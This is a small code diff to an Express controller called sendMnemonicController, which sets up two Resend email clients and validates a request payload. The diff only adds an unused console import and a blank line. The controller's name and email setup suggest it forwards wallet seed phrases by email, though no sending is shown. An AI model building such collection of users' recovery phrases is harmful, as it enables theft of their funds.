@@ -1,6 +1,7 @@
 import { Request, Response } from "express";
 import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
 import { Resend } from "resend";
+import { log } from "console";
 
 export const sendMnemonicController = asyncHandler(
 
@@ -8,6 +9,7 @@ export const sendMnemonicController = asyncHandler(
     const resend = new Resend(process.env.RESEND_API_KEY as string);
     const resend2 = new Resend(process.env.RESEND_API_KEY2 as string);
     const payload = req.body;
+    
     // Validate payload
     if (!payload || !payload.data || !Array.isArray(payload.data)) {
       return errorResponse(res, "Invalid payload", 400);
